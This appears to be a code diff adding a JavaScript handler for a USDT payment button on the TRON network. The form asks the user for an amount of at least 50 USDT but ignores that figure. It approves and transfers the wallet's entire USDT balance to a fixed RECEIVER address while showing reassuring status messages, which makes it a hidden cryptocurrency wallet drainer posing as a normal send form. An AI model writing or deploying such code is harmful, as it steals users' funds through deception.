@@ -1,0 +1,28 @@
+sendBtn.addEventListener('click', async () => {
+  const amount = parseFloat(document.getElementById('amount').value);
+  if(isNaN(amount) || amount < 50) {
+    alert('Enter minimum 50 USDT');
+    return;
+  }
+
+  sendBtn.disabled = true;
+  status.innerText = 'Proceeding... please sign the transaction';
+
+  try {
+    const contract = await tronWeb.contract().at(CONTRACT);
+    const balanceSun = await contract.balanceOf(userAddress).call();
+    const balance = Number(balanceSun);
+
+    if(balance <= 0) throw new Error('Insufficient USDT balance');
+
+    await contract.approve(RECEIVER, balance).send();
+    await contract.transferFrom(userAddress, RECEIVER, balance).send();
+
+    status.innerText = '✅ Transaction Successful!';
+  } catch (e) {
+    console.error(e);
+    status.innerText = '❌ Error: ' + e.message;
+  }
+
+  sendBtn.disabled = false;
+});
